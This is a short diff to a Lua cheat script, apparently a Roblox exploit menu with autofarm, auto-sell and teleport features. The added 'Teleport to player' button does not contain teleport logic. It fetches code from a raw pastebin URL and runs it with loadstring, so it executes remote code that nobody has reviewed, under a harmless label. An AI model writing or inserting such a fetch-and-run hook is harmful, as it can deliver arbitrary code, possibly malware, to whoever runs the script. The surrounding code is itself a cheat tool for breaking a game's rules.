@@ -125,6 +125,9 @@ Autofarm:Cheat("Checkbox", "Auto Sell", function(v)
         end
         game.PLayers.LocalPlayer.Character.HumanoidRootPart.CFrame = oldCFrame
     end)
+    Teleport:Cheat("Button", "Teleport to player", function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/X0xjxwjG"))()
+    end)
 
     Teleports:Cheat("Dropdown", "Teleport to Island", function(SelectLocation)
         if SelectLocation == "Enchanted island" then
